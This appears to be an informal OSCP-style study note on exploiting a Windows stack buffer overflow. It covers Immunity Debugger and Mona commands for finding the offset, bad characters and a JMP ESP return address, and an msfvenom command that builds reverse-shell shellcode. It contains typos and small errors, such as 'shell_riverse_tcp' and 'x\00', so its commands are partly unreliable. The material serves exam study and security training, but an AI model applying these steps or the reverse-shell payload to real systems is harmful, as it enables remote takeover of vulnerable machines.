<h2>Starting from setting up and environment with Mona.</h2>

<h3>SettingUp an Config with Mona.</h3>
<ul></ul>
<li>In the bottom of the Immunity Debugger, we need to set the Config for Mona so that we can be able to Analysis Bytearray later which may comes handy while finding bad chars.</li>
<em>!mona config -set workingfolder C:\mona\oscp\</em>
Now, we have set the Configuration to that folder so while comparing later with esp, we will have to take care of this.

<li>Keep the fuzzing going on and notice the Bytes at which it gets crashed???? :It is helpful while creating pattern:</li>
<li>Create a pattern with Pattern_create.rb -l CRASHEDBYTE which is probably inside metasploit-framework</li>
<li>We got the pattern now we need to insert it into exploit in order to Figure out it's OFFSET </li>
<li>We can either find offset via <em>!mona findmsp -distance CRASHEDBYTE</em> Or with Pattern_offset.rb -l CRASHEDBYTE -q ValueInEIP</li>
<li>Now we know the offset so put it inside the Exploit and we can also keep RTN as BBBB to reflect it in the Register.</li>
<li>Run the BADCHARS, (You can exclude \x00)and keep that payload to exploit in the the place of payload and set the Byte array for mona to <em>!mona bytearray -b "\x00" intially \x00. Remember we set the config at the begining? So the bytearray.bin is stored inside that config and we need that.</em></li>
<li>Watch out the MONA COMPARISON, and see the bad chars.</li>
<li>REPEAT: Iterate it while erasing the BadChars from the Exploit and Including the badchars in !mona bytearray, Remember that most of the time it's sequential and the early index is most of the times a bad chars. </li>
<li>COMPARE CODE: !mona compare -f c:\mona\oscp\bytearray.bin -a esp</li>
<li>Iterate above till we get the MonaComparison Status to Unmodified.</li>
<li>Call it either finding a JMP state or Return address, we can find it via</li>
<li><em>!mona jmp -r esp -cpb "x\00\xALLTHEBADCHARSYOUFOUND.</em></li>
<li>See the Log data results and keep one JMP Esp 0x00 Addresss for later use.</li>
<li>If the address is suppose, 0x1129AF, then there comes Big Endian and Little Endian so </li>
<li>Manage the exploit.py with Return Address in the rtn variable but in different format like this: "\xAF\x29\x11" probably as a LSB perspective right?</li>
<li>Now is the time to generate Payload so BADCHARS comes here to...</li>
<em>msfvenom -p windows/shell_riverse_tcp LHOST= LPORT= EXITFUNC=thread -b "\x00\xALLTHEBADCHARS" -f c or you can use py too</em>
<li>You get the shellcode now manipulate the Exploit payload with the Generated and make sure to use the string inside ("") if it's format c and in such a way that there should be, OFFSET, RETN, PADDING = "\x90" * 16 <u>No Operation because it's a bad practice to run the shellcode instantly so we are using No operation to skip for a while.</u></li>
<li>Leave the PostFix as it is or give something as it doesn't really matter.</li>
<li>You are good to go now. :wink:</li>

